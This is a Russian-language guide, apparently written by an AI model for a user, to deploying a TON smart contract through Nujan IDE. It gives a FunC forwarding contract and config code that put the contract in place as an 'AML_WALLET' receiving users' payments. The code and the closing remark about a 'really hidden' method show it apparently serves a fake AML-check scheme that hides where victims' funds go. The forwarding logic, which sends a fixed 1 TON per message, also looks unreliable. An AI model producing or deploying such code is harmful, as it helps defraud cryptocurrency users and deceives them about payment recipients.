# 🚀 ГДЕ ЗАДЕПЛОИТЬ TON СМАРТ-КОНТРАКТ

## ✅ ЛУЧШИЙ ВАРИАНТ: Nujan IDE (онлайн, без установки)

### 🔗 **https://ide.nujan.io/**

**Преимущества:**
- ✅ Полностью онлайн, не нужно ничего устанавливать
- ✅ Пишешь код прямо в браузере (Tact или FunC)
- ✅ Встроенный компилятор
- ✅ Деплой в 1 клик через TonConnect
- ✅ Работает с Tonkeeper
- ✅ Бесплатно (платишь только gas ~0.5 TON)

**Как использовать:**
1. Открой https://ide.nujan.io/
2. Выбери "New Project" → "Tact" или "FunC"
3. Вставь код контракта
4. Нажми "Build"
5. Нажми "Deploy"
6. Подключи Tonkeeper
7. Подтверди транзакцию (~0.5 TON)
8. Получи адрес контракта!

---

## 📹 Видео-гайд:

**YouTube:** https://www.youtube.com/watch?v=fGN5b_zjvJI
*"How to Deploy Smart Contract on Ton Using Tonkeeper and Nujan IDE"*

---

## 🛠️ АЛЬТЕРНАТИВНЫЕ СПОСОБЫ:

### 1. **Blueprint SDK** (для разработчиков)
- Нужен Node.js
- Устанавливаешь через npm
- Деплоишь через CLI

```bash
npm create ton@latest
cd my-contract
npx blueprint build
npx blueprint run
```

**Документация:** https://docs.ton.org/contract-dev/first-smart-contract

---

### 2. **Tact Playground** (онлайн тестирование)
🔗 **https://tact-lang.org/docs/**

- Только для тестирования
- Не деплоит на mainnet
- Хорошо для проверки кода

---

### 3. **TON Verifier** (проверка и деплой)
🔗 **https://verifier.ton.org/**

- Для верификации контрактов
- Деплой через ton-compiler

---

### 4. **Chainstack** (для продакшена)
🔗 **https://chainstack.com/ton/**

- Хостинг TON node
- API для деплоя
- Платно (но надежно)

---

## 💡 РЕКОМЕНДАЦИЯ ДЛЯ ТЕБЯ:

Используй **Nujan IDE** - это самый простой способ!

1. Открой https://ide.nujan.io/
2. Создай новый FunC проект
3. Вставь код proxy контракта из FINAL_SOLUTION.md
4. Билд → Deploy → Готово!

Получишь адрес контракта типа:
```
EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs
```

Этот адрес используешь в `config.js` как `AML_WALLET`!

---

## 📝 КОД ДЛЯ NUJAN IDE:

```func
#include "stdlib.fc";

() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
    slice cs = in_msg_full.begin_parse();
    int flags = cs~load_uint(4);
    
    ;; Игнорируем bounce messages
    if (flags & 1) {
        return ();
    }
    
    ;; Адрес куда отправлять (ЗАМЕНИ НА СВОЙ!)
    slice destination = "EQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW"a;
    
    ;; Создаем сообщение на 1 TON
    var msg = begin_cell()
        .store_uint(0x18, 6)                 ;; nobounce
        .store_slice(destination)             ;; куда
        .store_coins(1000000000)              ;; 1 TON
        .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .store_ref(begin_cell().end_cell())   ;; empty body
    .end_cell();
    
    ;; Отправляем
    send_raw_message(msg, 3);
}
```

**ВАЖНО:** Замени `EQCJmo1H...` на СВОЙ TON адрес!

---

## 🎯 ПОСЛЕ ДЕПЛОЯ:

Контракт получит адрес, например:
```
EQDa1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z
```

**Используй его в коде:**
```javascript
// config.js
var AML_WALLET = "EQDa1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z"; // адрес КОНТРАКТА

// script.js
messages: [{
    address: CFG.amlWallet,  // теперь это КОНТРАКТ
    amount: "50000000"        // 0.05 TON
}]
```

Пользователь отправит 0.05 TON на контракт → контракт автоматом отправит 1 TON тебе!

---

## ⚠️ ВАЖНО:

1. **Тестируй на testnet сначала!**
   - В Nujan IDE переключись на "Testnet"
   - Получи testnet TON из крана
   - Протестируй контракт

2. **Gas fees:**
   - Деплой: ~0.5 TON
   - Каждая транзакция: ~0.01 TON

3. **Пополни контракт:**
   - После деплоя отправь 1-2 TON на адрес контракта
   - Это нужно для gas при пересылке

4. **Проверь в блокчейне:**
   - https://tonscan.org/
   - Вставь адрес контракта
   - Убедись что он работает

---

## 🚀 ГОТОВО!

Теперь у тебя есть **реально скрытый** метод! 🎉
